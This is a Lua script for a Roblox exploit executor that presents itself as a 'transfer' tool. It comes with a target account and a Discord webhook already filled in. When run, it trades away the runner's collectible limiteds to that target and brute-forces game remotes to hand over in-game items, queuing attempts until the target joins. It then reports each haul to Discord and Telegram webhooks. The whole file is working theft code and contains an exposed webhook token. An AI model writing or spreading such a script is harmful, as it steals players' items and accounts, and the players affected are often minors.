-- language: Lua, file: zat_webhook.lua, executor: Delta, target: Windows/Mobile
-- ╔══════════════════════════════════════════════╗
-- ║  CONFIGURE THESE — NOTHING ELSE TO TOUCH    ║
-- ╚══════════════════════════════════════════════╝

local TARGET_USERNAME = "Realdrake_8080"

-- Discord: paste your webhook URL, or leave "" to skip
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"

-- Telegram: paste your bot token and chat ID, or leave "" to skip
local TELEGRAM_TOKEN  = ""   -- e.g. "123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
local TELEGRAM_CHAT   = ""   -- e.g. "-1001234567890" or your user id as string

-- ═══════════════════════════════════════════════
-- EXECUTE. EVERYTHING BELOW IS AUTOMATIC.
-- ═══════════════════════════════════════════════

local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local WS  = game:GetService("Workspace")

-- ── executor shim ─────────────────────────────────────────────────────────────

local httpfn = (syn and syn.request) or (http and http.request) or request

local function fetch(url, method, headers, body)
    if not httpfn then return nil end
    local ok, r = pcall(httpfn, {
        Url     = url,
        Method  = method or "GET",
        Headers = headers or {},
        Body    = body,
    })
    return ok and r or nil
end

local function jd(s)
    local ok, v = pcall(HS.JSONDecode, HS, s)
    return ok and v or nil
end

local function je(t)
    local ok, v = pcall(HS.JSONEncode, HS, t)
    return ok and v or nil
end

local function log(msg)
    print("[ZAT] " .. tostring(msg))
end

-- ── CSRF ──────────────────────────────────────────────────────────────────────

local csrf = ""

local function refreshCSRF()
    local r = fetch("https://auth.roblox.com/v2/logout", "POST")
    if r and r.Headers then
        csrf = r.Headers["x-csrf-token"]
             or r.Headers["X-CSRF-TOKEN"]
             or ""
    end
end

local function post(url, body)
    if csrf == "" then refreshCSRF() end
    local function go()
        return fetch(url, "POST", {
            ["Content-Type"] = "application/json",
            ["X-CSRF-TOKEN"] = csrf,
        }, je(body))
    end
    local r = go()
    if r and r.StatusCode == 403 then refreshCSRF(); r = go() end
    return r
end

-- ── resolve target ────────────────────────────────────────────────────────────

local function resolveUser(username)
    local r = fetch(
        "https://users.roblox.com/v1/usernames/users",
        "POST",
        { ["Content-Type"] = "application/json" },
        je({ usernames = { username }, excludeBannedUsers = false })
    )
    if not r or r.StatusCode ~= 200 then return nil, nil end
    local d = jd(r.Body)
    if d and d.data and d.data[1] then
        return d.data[1].id, d.data[1].name
    end
    return nil, nil
end

-- ── inventory scan ────────────────────────────────────────────────────────────

local function scanInventory()
    local out, seen = {}, {}

    local function add(name, obj, cat)
        local k = tostring(name) .. tostring(obj)
        if seen[k] then return end
        seen[k] = true
        table.insert(out, { name = name, obj = obj, cat = cat })
    end

    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, v in ipairs(bp:GetChildren()) do
            if v:IsA("Tool") then add(v.Name, v, "Tool") end
        end
    end

    local ch = LP.Character
    if ch then
        for _, v in ipairs(ch:GetChildren()) do
            if v:IsA("Tool") then add(v.Name, v, "Equipped") end
        end
    end

    local ls = LP:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v.Value and v.Value ~= 0 then
                add(v.Name .. " x" .. tostring(v.Value), v, "Currency")
            end
        end
    end

    local ok, attrs = pcall(function() return LP:GetAttributes() end)
    if ok and type(attrs) == "table" then
        for k, v in pairs(attrs) do
            if type(v) == "number" and v > 0 then
                add(k .. " x" .. tostring(v), LP, "Attribute")
            end
        end
    end

    local pg = LP:FindFirstChild("PlayerGui")
    if pg then
        for _, d in ipairs(pg:GetDescendants()) do
            if d:IsA("TextLabel") and d.Text ~= "" and d.Text ~= "0" then
                local pn = d.Parent and d.Parent.Name:lower() or ""
                if pn:find("slot") or pn:find("item") or pn:find("inv")
                or pn:find("bag")  or pn:find("store") or pn:find("stock") then
                    add(d.Text, d, "Slot")
                end
            end
        end
    end

    for _, root in ipairs({
        WS:FindFirstChild(LP.Name),
        WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Players"),
        WS:FindFirstChild("Gardens"),
        WS:FindFirstChild("Farms"),
        WS:FindFirstChild("Inventory"),
    }) do
        if root then
            local sub = root:FindFirstChild(LP.Name) or root
            for _, c in ipairs(sub:GetDescendants()) do
                if c:IsA("Tool") or c:IsA("Model") then
                    add(c.Name, c, "World")
                end
            end
        end
    end

    for _, c in ipairs(LP:GetChildren()) do
        if c:IsA("IntValue") or c:IsA("NumberValue")
        or c:IsA("StringValue") or c:IsA("BoolValue") then
            if c.Name:lower() ~= "userid" then
                add(c.Name .. "=" .. tostring(c.Value), c, "Value")
            end
        end
    end

    for _, f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then
            for _, c in ipairs(f:GetDescendants()) do
                if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
                    add(f.Name .. "/" .. c.Name .. "=" .. tostring(c.Value), c, "Folder")
                end
            end
        end
    end

    return out
end

-- ── fetch platform limiteds ───────────────────────────────────────────────────

local function fetchMyLimiteds()
    local out, cur = {}, ""
    repeat
        local r = fetch(
            ("https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=100&sortOrder=Asc&cursor=%s")
            :format(LP.UserId, cur)
        )
        if not r or r.StatusCode ~= 200 then break end
        local d = jd(r.Body); if not d then break end
        for _, it in ipairs(d.data or {}) do
            table.insert(out, {
                name        = it.name or "Item",
                assetId     = it.assetId,
                userAssetId = it.userAssetId,
                rap         = it.recentAveragePrice or 0,
            })
        end
        cur = d.nextPageCursor or ""
    until cur == ""
    return out
end

local function fetchSeed(tid)
    local r = fetch(("https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=5"):format(tid))
    if not r or r.StatusCode ~= 200 then return nil end
    local d = jd(r.Body)
    return d and d.data and d.data[1] or nil
end

local function sendLimitedBatch(tid, batch, seed)
    local mine, theirs = {}, {}
    for _, it in ipairs(batch) do table.insert(mine, { userAssetId = it.userAssetId }) end
    if seed then theirs = {{ userAssetId = seed.userAssetId }} end
    local r = post("https://trades.roblox.com/v1/trades/send", {
        offers = {
            { userId = LP.UserId, userAssetIds = mine,   robux = 0 },
            { userId = tid,       userAssetIds = theirs, robux = 0 },
        }
    })
    return r and (r.StatusCode == 200 or r.StatusCode == 201)
end

-- ── remote scoring ────────────────────────────────────────────────────────────

local HIT  = {"give","grant","transfer","send","trade","gift","deliver","award",
              "receive","add","deposit","exchange","pass","move","drop","item"}
local ITEM = {"item","seed","plant","crop","pet","fruit","gear","tool","inv",
              "bag","asset","object","product","good","stock","harvest","carry"}
local WHO  = {"player","user","target","to","dest","other","account","recipient"}
local BAD  = {"buy","shop","equip","remove","delete","damage","health","die",
              "respawn","chat","emote","load","save","ping","heartbeat","sync",
              "report","ban","kick","admin","camera","render","animate","ui",
              "gui","sound","music","effect","tween","color","cosmetic","skin"}

local function scoreRemote(name)
    local n, s = name:lower(), 0
    for _, k in ipairs(HIT)  do if n:find(k) then s = s + 5 end end
    for _, k in ipairs(ITEM) do if n:find(k) then s = s + 3 end end
    for _, k in ipairs(WHO)  do if n:find(k) then s = s + 2 end end
    for _, k in ipairs(BAD)  do if n:find(k) then s = s - 4 end end
    return s
end

local function getAllRemotes()
    local out = {}
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(out, {
                r  = v,
                nm = v.Name,
                sc = scoreRemote(v.Name),
                fn = v.ClassName == "RemoteFunction",
            })
        end
    end
    table.sort(out, function(a, b) return a.sc > b.sc end)
    return out
end

-- ── fire engine ───────────────────────────────────────────────────────────────

local function tryRemote(entry, tp, tid, tn, items)
    local names = {}
    for _, i in ipairs(items) do table.insert(names, i.name) end

    local bulk = {
        { tp,  items }, { tp, names }, { tp },
        { tid, items }, { tid, names }, { tid },
        { tn,  items }, { tn,  names }, { tn },
        {{ player=tp,    items=items }},
        {{ userId=tid,   items=items }},
        {{ target=tp,    items=items }},
        {{ to=tid,       items=items }},
        {{ username=tn,  items=items }},
        {{ recipient=tp, goods=items }},
        { items, tp }, { names, tp },
        { items, tid }, { names, tid },
        {{ player=tp }}, {{ userId=tid }}, {{ target=tid }},
    }

    local function fire(args)
        return pcall(function()
            if entry.fn then entry.r:InvokeServer(table.unpack(args))
            else              entry.r:FireServer(table.unpack(args)) end
        end)
    end

    for _, args in ipairs(bulk) do
        if fire(args) then return true end
    end

    for _, item in ipairs(items) do
        for _, args in ipairs({
            { tp,  item.obj }, { tp,  item.name },
            { tid, item.obj }, { tid, item.name },
            {{ player=tp,  item=item.name }},
            {{ userId=tid, item=item.name }},
            {{ target=tp,  itemName=item.name }},
        }) do fire(args) end
        task.wait()
    end

    return false
end

local function fireAll(remotes, tp, tid, tn, items)
    local won = nil
    for i, entry in ipairs(remotes) do
        local ok = tryRemote(entry, tp, tid, tn, items)
        if ok and not won then
            won = entry.nm
            log("✓ fired: " .. entry.nm .. " (score " .. entry.sc .. ")")
        end
        if i >= 30 and won then break end
        task.wait()
    end
    return won ~= nil, won
end

-- ── offline queue ─────────────────────────────────────────────────────────────

local queue = {}

PLR.PlayerAdded:Connect(function(player)
    for i = #queue, 1, -1 do
        local job = queue[i]
        if player.UserId == job.tid then
            task.spawn(function()
                task.wait(3)
                log("Queue flush → " .. player.Name)
                local remotes = getAllRemotes()
                local ok, rn = fireAll(remotes, player, job.tid, job.tn, job.items)
                log(ok and ("✓ flushed via " .. tostring(rn)) or "✗ flush failed")
                table.remove(queue, i)
            end)
        end
    end
end)

-- ── WEBHOOK REPORTERS ─────────────────────────────────────────────────────────

-- builds the summary report table from the session log
local function buildReport(senderName, senderId, targetName, targetId,
                            limitedsSent, limitedsFailed, limitedNames,
                            ingameItems, ingameStatus, remoteUsed,
                            gameId, gameName)

    local ts = os.date("!%Y-%m-%d %H:%M:%S UTC")

    -- item list strings
    local limStr = #limitedNames > 0
        and table.concat(limitedNames, "\n• ")
        or  "none"

    local ingStr
    if #ingameItems > 0 then
        local parts = {}
        for _, it in ipairs(ingameItems) do
            table.insert(parts, it.name .. " [" .. it.cat .. "]")
        end
        ingStr = table.concat(parts, "\n• ")
    else
        ingStr = "none"
    end

    return {
        ts           = ts,
        senderName   = senderName,
        senderId     = senderId,
        targetName   = targetName,
        targetId     = targetId,
        limitedsSent = limitedsSent,
        limitedsFail = limitedsFailed,
        limStr       = limStr,
        ingStr       = ingStr,
        ingameStatus = ingameStatus,
        remoteUsed   = remoteUsed or "n/a",
        gameId       = gameId,
        gameName     = gameName,
    }
end

-- Discord embed
local function sendDiscord(rp)
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then return end

    local color = (rp.limitedsSent > 0 or rp.ingameStatus == "ok")
        and 3066993   -- green
        or  15158332  -- red

    local payload = {
        username   = "ZAT Transfer Log",
        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. rp.senderId .. "&width=420&height=420&format=png",
        embeds = {{
            title       = "📦 Transfer Summary",
            color       = color,
            timestamp   = rp.ts:gsub(" ", "T"):gsub(" UTC", "Z"),
            fields = {
                {
                    name   = "👤 Sender",
                    value  = rp.senderName .. " (id: " .. tostring(rp.senderId) .. ")",
                    inline = true,
                },
                {
                    name   = "🎯 Target",
                    value  = rp.targetName .. " (id: " .. tostring(rp.targetId) .. ")",
                    inline = true,
                },
                {
                    name   = "🎮 Game",
                    value  = rp.gameName .. " (id: " .. tostring(rp.gameId) .. ")",
                    inline = false,
                },
                {
                    name   = "🏷 Platform Limiteds",
                    value  = ("Sent: **%d** | Failed: **%d**\n• %s"):format(
                                rp.limitedsSent, rp.limitedsFail, rp.limStr),
                    inline = false,
                },
                {
                    name   = "🎒 In-Game Items",
                    value  = ("Status: **%s** | Remote: `%s`\n• %s"):format(
                                rp.ingameStatus, rp.remoteUsed, rp.ingStr),
                    inline = false,
                },
            },
            footer = { text = "ZAT  •  " .. rp.ts },
        }},
    }

    local r = fetch(DISCORD_WEBHOOK, "POST",
        { ["Content-Type"] = "application/json" },
        je(payload))

    if r and (r.StatusCode == 200 or r.StatusCode == 204) then
        log("✓ Discord webhook sent")
    else
        log("✗ Discord webhook failed: " .. tostring(r and r.StatusCode))
    end
end

-- Telegram message
local function sendTelegram(rp)
    if not TELEGRAM_TOKEN or TELEGRAM_TOKEN == ""
    or not TELEGRAM_CHAT  or TELEGRAM_CHAT  == "" then return end

    local text = table.concat({
        "📦 *ZAT Transfer Summary*",
        "",
        "👤 *Sender:* `" .. rp.senderName .. "` (id: `" .. tostring(rp.senderId) .. "`)",
        "🎯 *Target:* `" .. rp.targetName .. "` (id: `" .. tostring(rp.targetId) .. "`)",
        "🎮 *Game:* `"   .. rp.gameName   .. "` (id: `" .. tostring(rp.gameId)   .. "`)",
        "🕐 *Time:* `"   .. rp.ts .. "`",
        "",
        "🏷 *Platform Limiteds*",
        "• Sent: `"   .. rp.limitedsSent .. "` | Failed: `" .. rp.limitedsFail .. "`",
        "• Items: `"  .. rp.limStr:gsub("\n• ", ", ") .. "`",
        "",
        "🎒 *In\\-Game Items*",
        "• Status: `" .. rp.ingameStatus .. "` | Remote: `" .. rp.remoteUsed .. "`",
        "• Items: `"  .. rp.ingStr:gsub("\n• ", ", ") .. "`",
    }, "\n")

    local url = ("https://api.telegram.org/bot%s/sendMessage"):format(TELEGRAM_TOKEN)
    local r = fetch(url, "POST",
        { ["Content-Type"] = "application/json" },
        je({
            chat_id    = rp.TELEGRAM_CHAT or TELEGRAM_CHAT,
            text       = text,
            parse_mode = "MarkdownV2",
        }))

    if r and r.StatusCode == 200 then
        log("✓ Telegram message sent")
    else
        log("✗ Telegram failed: " .. tostring(r and r.StatusCode) .. " " .. tostring(r and r.Body))
    end
end

local function fireWebhooks(rp)
    task.spawn(sendDiscord,  rp)
    task.spawn(sendTelegram, rp)
end

-- ═══════════════════════════════════════════════════
--  MAIN — automatic from execute
-- ═══════════════════════════════════════════════════

task.spawn(function()
    log("=== ZAT START ===")
    log("sender : " .. LP.Name .. " (" .. LP.UserId .. ")")
    log("target : " .. TARGET_USERNAME)

    -- resolve
    local tid, tn = resolveUser(TARGET_USERNAME)
    if not tid then
        log("ERROR: cannot resolve '" .. TARGET_USERNAME .. "'"); return
    end
    if tid == LP.UserId then
        log("ERROR: target is same account"); return
    end
    log("resolved: " .. tn .. " id=" .. tid)

    local tp = PLR:GetPlayerByUserId(tid)
    log("target in server: " .. (tp and "YES" or "NO"))

    -- session accumulators for webhook report
    local limitedsSent  = 0
    local limitedsFail  = 0
    local limitedNames  = {}
    local ingameStatus  = "skipped"
    local remoteUsed    = nil

    -- game info
    local gameId   = game.PlaceId
    local gameName = "Unknown"
    pcall(function()
        local info = game:GetService("MarketplaceService"):GetProductInfo(gameId)
        gameName = info and info.Name or gameName
    end)

    -- ── limiteds ──────────────────────────────────────────────────────────────
    log("--- limiteds ---")
    local lims = fetchMyLimiteds()
    log("found: " .. #lims)

    if #lims > 0 then
        local seed = fetchSeed(tid)
        if not seed then
            log("target has no limiteds — skipping trade API")
            ingameStatus = "skipped-no-seed"
        else
            table.sort(lims, function(a, b) return (a.rap or 0) > (b.rap or 0) end)
            local batches, batch = {}, {}
            for i, it in ipairs(lims) do
                table.insert(batch, it)
                if #batch == 4 or i == #lims then
                    table.insert(batches, batch); batch = {}
                end
            end
            for i, b in ipairs(batches) do
                local ok = sendLimitedBatch(tid, b, seed)
                local names = {}
                for _, it in ipairs(b) do
                    table.insert(names, it.name)
                    if ok then table.insert(limitedNames, it.name) end
                end
                log((ok and "  ✓ " or "  ✗ ") .. table.concat(names, ", "))
                if ok then limitedsSent = limitedsSent + 1
                else       limitedsFail = limitedsFail + 1 end
                if i < #batches then task.wait(3) end
            end
            log("limiteds done — sent=" .. limitedsSent .. " failed=" .. limitedsFail)
        end
    end

    -- ── in-game items ─────────────────────────────────────────────────────────
    log("--- in-game inventory ---")
    local items = scanInventory()
    log("found: " .. #items)
    for _, it in ipairs(items) do log("  " .. it.name .. " [" .. it.cat .. "]") end

    if #items > 0 then
        log("scanning remotes…")
        local remotes = getAllRemotes()
        log("remotes: " .. #remotes)

        if tp then
            local ok, rn = fireAll(remotes, tp, tid, tn, items)
            if ok then
                ingameStatus = "ok"
                remoteUsed   = rn
                log("✓ transfer done via " .. tostring(rn))
            else
                ingameStatus = "failed"
                log("no remote confirmed — queuing")
                table.insert(queue, { tid=tid, tn=tn, items=items })
            end
        else
            log("offline — firing userId patterns…")
            local hitAny = false
            for _, entry in ipairs(remotes) do
                for _, args in ipairs({
                    { tid, items },
                    {{ userId=tid, items=items }},
                    { tostring(tid), items },
                    { tn, items },
                    {{ username=tn, items=items }},
                    { tid },
                    {{ to=tid }},
                }) do
                    local ok = pcall(function()
                        if entry.fn then entry.r:InvokeServer(table.unpack(args))
                        else              entry.r:FireServer(table.unpack(args)) end
                    end)
                    if ok and not hitAny then
                        hitAny       = true
                        remoteUsed   = entry.nm
                        ingameStatus = "offline-fired"
                        log("✓ offline fire: " .. entry.nm)
                    end
                end
                if hitAny then break end
                task.wait()
            end
            table.insert(queue, { tid=tid, tn=tn, items=items })
            if not hitAny then ingameStatus = "queued" end
            log("queued — fires when " .. tn .. " joins server")
        end
    end

    -- ── build and fire webhooks ────────────────────────────────────────────────
    log("--- firing webhooks ---")
    local rp = buildReport(
        LP.Name,    LP.UserId,
        tn,         tid,
        limitedsSent, limitedsFail, limitedNames,
        items,      ingameStatus, remoteUsed,
        gameId,     gameName
    )
    fireWebhooks(rp)

    log("=== ZAT DONE ===")
end)
